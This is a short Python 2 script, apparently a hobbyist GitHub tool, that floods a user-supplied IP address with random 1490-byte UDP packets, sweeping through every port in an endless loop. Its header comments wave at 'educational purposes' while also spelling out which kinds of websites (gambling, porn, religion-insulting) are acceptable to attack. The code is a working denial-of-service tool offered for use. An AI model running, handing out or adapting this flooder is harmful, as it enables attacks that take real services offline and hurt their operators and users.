#No template available
#Read to learn simple
#Educational Purposes
#Your legal your risk
#Don't attack MY and ID domain website
#don't have a requirement to attack your own country except
###p*rno or contempt of religion or casino or toto or other judi's web.

#mula
#import some libraries
try:
  import sys, socket, time, random, os
  from colorama import Fore, Style
  from datetime import datetime
except:
  exit('''Install "requirements.txt" and try again.''')
#time function
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year
#########
#make background use colorama,
#to calling color i save it in the class function
class bg:
 red = Fore.RED
 yellow = Fore.YELLOW
 green = Fore.LIGHTGREEN_EX
 reset = Style.RESET_ALL
#########
#pull socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#########
#banner saved
banner="""|------------------------------------|
 +Author : Mika97(Mika259)+
 +Github : https://github.com/Mika259+
 +Version : 0.2+
|------------------------------------|
"""
#########
#display banner
print bg.green+banner+bg.reset
#########
#take inputs from user
ip = raw_input("%s Enter Ip : "%bg.yellow)
port = input(" Port : ")
########
#show loading
time.sleep(0.5)
print "%sAttack Starting in 5 seconds..."%bg.red
time.sleep(5)
########
os.system("clear")
sent = 0
#while loop send packets into port server
while True:
     sock.sendto(bytes, (ip,port))
     sent += 1
     port += 1
     print "sent %s packet to %s throught port %s"%(sent,ip,port)
     if port == 65534:
       port = 1
#########
#sayaAnakMalaysia1
#savepalestine
#alleyesinrafah
#sorry for mistakes , please tell me
